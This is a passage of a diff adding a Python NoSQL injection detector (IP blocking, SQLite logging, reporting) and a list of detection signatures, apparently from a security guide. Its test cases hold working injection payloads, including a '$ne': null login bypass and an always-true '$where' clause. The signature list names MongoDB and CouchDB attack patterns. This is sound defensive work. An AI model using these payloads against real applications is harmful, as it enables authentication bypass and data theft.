+        })
+
+        # Update operator usage statistics
+        for operator in detection_results['operators_used']:
+            self.operator_usage[operator].append({
+                'timestamp': current_time,
+                'source_ip': source_ip
+            })
+
+    def should_block_ip(self, source_ip):
+        """Determine if IP should be blocked based on behavioral analysis"""
+        attempts = self.ip_activity.get(source_ip, [])
+
+        # Too many attempts threshold
+        if len(attempts) >= self.thresholds['requests_per_minute']:
+            return True
+
+        # Check for diverse operator usage
+        all_operators = set()
+        for attempt in attempts:
+            all_operators.update(attempt['operators_used'])
+        if len(all_operators) >= self.thresholds['unique_operators_per_ip']:
+            return True
+
+        # Check for high-risk patterns
+        high_risk_count = sum(1 for attempt in attempts if attempt['risk_score'] >= 80)
+        if high_risk_count >= 3:
+            return True
+
+        # Check for authentication bypass attempts
+        auth_bypass_count = sum(1 for attempt in attempts
+                               if 'auth_bypass' in attempt['injection_types'])
+        if auth_bypass_count >= 5:
+            return True
+
+        return False
+
+    def log_attempt(self, detection_results, payload):
+        """Log attempt to database"""
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+
+        cursor.execute('''
+            INSERT INTO nosql_attempts
+            (timestamp, source_ip, target_url, payload, injection_type,
+             operators_used, risk_score, response_time, blocked)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            detection_results['timestamp'],
+            detection_results['source_ip'],
+            detection_results['target_url'],
+            payload[:500],  # Truncate long payloads
+            ','.join(detection_results['injection_types']),
+            ','.join(detection_results['operators_used']),
+            detection_results['risk_score'],
+            detection_results['response_time'],
+            detection_results['should_block']
+        ))
+
+        # Update operator statistics
+        for operator in detection_results['operators_used']:
+            cursor.execute('''
+                INSERT OR REPLACE INTO operator_stats
+                (operator, usage_count, last_seen, associated_ips)
+                VALUES (?,
+                        COALESCE((SELECT usage_count FROM operator_stats WHERE operator = ?), 0) + 1,
+                        ?, ?)
+            ''', (
+                operator,
+                operator,
+                detection_results['timestamp'],
+                detection_results['source_ip']
+            ))
+
+        conn.commit()
+        conn.close()
+
+    def generate_report(self, hours=24):
+        """Generate detection report"""
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+
+        cutoff_time = (datetime.now() - timedelta(hours=hours)).isoformat()
+
+        # Get attack statistics
+        cursor.execute('''
+            SELECT injection_type, COUNT(*) as count, AVG(risk_score) as avg_risk
+            FROM nosql_attempts
+            WHERE timestamp > ?
+            GROUP BY injection_type
+            ORDER BY count DESC
+        ''', (cutoff_time,))
+
+        attack_stats = cursor.fetchall()
+
+        # Get operator usage statistics
+        cursor.execute('''
+            SELECT operators_used, COUNT(*) as usage_count
+            FROM nosql_attempts
+            WHERE timestamp > ? AND operators_used != ""
+            GROUP BY operators_used
+            ORDER BY usage_count DESC
+            LIMIT 10
+        ''', (cutoff_time,))
+
+        operator_stats = cursor.fetchall()
+
+        # Get top attacking IPs
+        cursor.execute('''
+            SELECT source_ip, COUNT(*) as attempts, MAX(risk_score) as max_risk,
+                   AVG(response_time) as avg_response_time
+            FROM nosql_attempts
+            WHERE timestamp > ?
+            GROUP BY source_ip
+            ORDER BY attempts DESC
+            LIMIT 10
+        ''', (cutoff_time,))
+
+        top_ips = cursor.fetchall()
+
+        conn.close()
+
+        report = {
+            'generated_at': datetime.now().isoformat(),
+            'time_period_hours': hours,
+            'attack_statistics': [
+                {'type': row[0], 'count': row[1], 'avg_risk': row[2]}
+                for row in attack_stats
+            ],
+            'operator_usage': [
+                {'operators': row[0], 'count': row[1]}
+                for row in operator_stats
+            ],
+            'top_attacking_ips': [
+                {'ip': row[0], 'attempts': row[1], 'max_risk': row[2], 'avg_response_time': row[3]}
+                for row in top_ips
+            ]
+        }
+
+        return report
+
+# Example usage and testing
+def test_detector():
+    """Test the NoSQL injection detector"""
+    detector = NoSQLInjectionDetector()
+
+    # Test cases
+    test_requests = [
+        {
+            'ip': '192.168.1.100',
+            'url': '/api/login',
+            'params': {},
+            'body': '{"email": {"$ne": null}, "password": {"$ne": null}}',
+            'headers': {},
+            'response_time': 0.5
+        },
+        {
+            'ip': '192.168.1.101',
+            'url': '/api/search',
+            'params': {'query': '{"$where": "this.price > 0 || true"}'},
+            'body': '',
+            'headers': {},
+            'response_time': 6.2
+        },
+        {
+            'ip': '192.168.1.102',
+            'url': '/api/users',
+            'params': {'filter': '{"username": {"$regex": "^admin"}}'},
+            'body': '',
+            'headers': {},
+            'response_time': 1.1
+        }
+    ]
+
+    for i, request in enumerate(test_requests):
+        print(f"\nTesting request {i+1}:")
+        result = detector.analyze_request(request)
+
+        if result['detected_patterns']:
+            print(f"✗ NoSQL Injection detected from {result['source_ip']}")
+            print(f"  Types: {', '.join(result['injection_types'])}")
+            print(f"  Operators: {', '.join(result['operators_used'])}")
+            print(f"  Risk Score: {result['risk_score']}")
+            print(f"  Response Time: {result['response_time']}s")
+            print(f"  Should Block: {result['should_block']}")
+        else:
+            print(f"✓ Clean request from {result['source_ip']}")
+
+    # Generate report
+    print("\n" + "="*50)
+    print("DETECTION REPORT")
+    print("="*50)
+
+    report = detector.generate_report(hours=1)
+    print(json.dumps(report, indent=2))
+
+if __name__ == "__main__":
+    test_detector()
+```
+
+### Key Detection Metrics
+
+**Behavioral Indicators:**
+
+- **Multiple NoSQL operators per request**: ≥3 different operators in single query
+- **Operator diversity from single IP**: ≥8 unique operators used
+- **Rapid injection attempts**: >15 requests per minute
+- **Authentication bypass patterns**: Multiple `$ne`, `$gt`, `$regex` combinations
+- **JavaScript injection complexity**: Function definitions and time delays
+
+**Network Signatures:**
+
+- **MongoDB operators**: `$ne`, `$gt`, `$lt`, `$regex`, `$where`, `$exists`, `$in`, `$nin`
+- **JavaScript patterns**: `function()`, `sleep()`, `this.`, `new Date`, `while()`
+- **Authentication bypass**: `$ne null`, `$gt ""`, `$regex .*`, `$exists true`
+- **CouchDB specific**: `_all_dbs`, `_users`, `startkey`, `endkey`
+- **Time-based indicators**: Extended response times with sleep functions
+
+**Response Analysis:**
+
+- **HTTP 500 errors** with database error messages
+- **Authentication responses** (200/401) to bypass attempts
+- **Extended response times** for time-based attacks (>3 seconds)
+- **Large response sizes** indicating successful data extraction
+- **Error patterns** revealing database structure information
 
 ## Detection and Monitoring
 
